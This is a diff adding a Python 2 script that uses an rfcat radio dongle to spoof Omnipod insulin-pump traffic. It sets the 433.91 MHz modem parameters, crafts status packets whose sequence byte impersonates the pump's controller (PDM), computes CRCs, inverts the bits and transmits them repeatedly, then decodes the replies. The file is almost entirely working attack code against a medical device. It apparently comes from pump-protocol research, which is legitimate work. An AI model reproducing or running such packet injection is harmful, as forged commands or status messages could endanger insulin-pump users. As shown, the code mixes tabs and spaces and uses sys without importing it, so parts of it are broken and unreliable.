@@ -1,0 +1,115 @@
+#!/usr/bin/env python2
+
+from rflib import *
+import binascii
+import time
+import datetime
+import argparse
+from openomni import Packet
+import crccheck
+
+def flip_bytes(data):
+    """flip_bytes inverts bytes"""
+    bytes = map(lambda x: ord(x) ^ 0xff, data)
+    return bytearray(bytes).__str__()
+
+def flip_bytes_format_send(data):
+    """Flips bytes and outputs hex string appropriate for RFxmit""" 
+    hex_str = "" 
+    for k,v in enumerate(data): 
+        if (k % 2) == 0 and k < len(data) - 1: 
+            byte = v + data[k+1] 
+            byte_bin = bin(int(byte, 16))[2:].zfill(8) 
+            inverted = "" 
+            for k,v in enumerate(byte_bin): 
+                if v == '0': 
+                    inverted += '1' 
+                else: 
+                    inverted += '0' 
+            hex_str += "\\x" + "{0:02x}".format(int(inverted,2)) 
+    return hex_str
+
+def craft_seq(previous_seq):
+    """Craft a sequence byte that impersonates the PDM"""
+    pdm = '101'
+    bin_str = pdm + format(previous_seq,'#07b')[2:]
+    int_str = int(bin_str,2)
+    return hex(int_str)
+
+def gen_crc(packet_base):
+    """Generate an 8-bit CRC based on packet data"""
+    computed_crc = crccheck.crc.Crc8.calc(bytearray(packet_base.decode('hex')))
+    return computed_crc
+
+def craft_status(id='1f02d5af', pre_seq=00, pod_seq=00):
+    """Send_status is to send a status packet from POD to PDM"""
+    # pod id is hardcoded
+    # the last fragment (body component) of base string is also hardcoded
+    base = id + str(craft_seq(pre_seq))[2:] + id + str(pod_seq) + '03' + '0e01' + '008195'
+    crc = gen_crc(base)
+    crc = hex(crc)[2:]
+    return base + crc
+
+def quick_setup(device, bitrate=40625, json=False):
+	"""quick_setup is used to setup rfcat to quickly decode omnipod signals"""
+	device.setFreq(433.91e6)
+	device.setMdmModulation(MOD_2FSK)
+	device.setPktPQT(1)
+	device.setMdmSyncMode(SYNCM_CARRIER_16_of_16)
+	device.setMdmSyncWord(0x54c3)
+	device.makePktFLEN(50)
+	device.setEnableMdmManchester(True)
+	device.setMdmDRate(bitrate)
+	device.setRFRegister(0xdf18, 0x70)
+        
+        send_count = 0
+        
+        while not keystop():
+		try:
+                        
+                        # Transmit 
+                        # Requires a hardcoded sequence number and b9 (pod_seq)
+                        if send_count < 10: 
+                            crafted = craft_status(pre_seq=20, pod_seq=38)
+                            print "Crafted: " + crafted
+                            crafted = flip_bytes_format_send(crafted)
+                            print "Bytes Sent: " + crafted
+                            send_count += 1
+                            device.RFxmit(crafted)
+                        
+                        pkt,ts = device.RFrecv()
+                        pkt = flip_bytes(pkt)
+			rcv_time = datetime.datetime.now()
+
+                        x = 0
+			while x < len(pkt):
+				packet = Packet(pkt[:len(pkt) - (x + 1)])
+				packet.received_at = rcv_time
+				if packet.is_valid():
+					#print packet.data.encode('hex')
+					if json:
+						print packet.as_json()
+					else:
+						print packet
+				x += 1
+
+		except ChipconUsbTimeoutException:
+                    time.sleep(0.5)
+
+
+	sys.stdin.read(1)
+
+
+def main(options=None):
+
+    parser = argparse.ArgumentParser(description='Capture omnipod packets using rfcat.')
+    parser.add_argument('--json', action='store_true',
+                        help='print as json (default: text line)')
+
+    args = parser.parse_args()
+
+    d = RfCat(0, debug=False)
+    quick_setup(d, json=args.json)
+
+if __name__ == '__main__':
+	main()
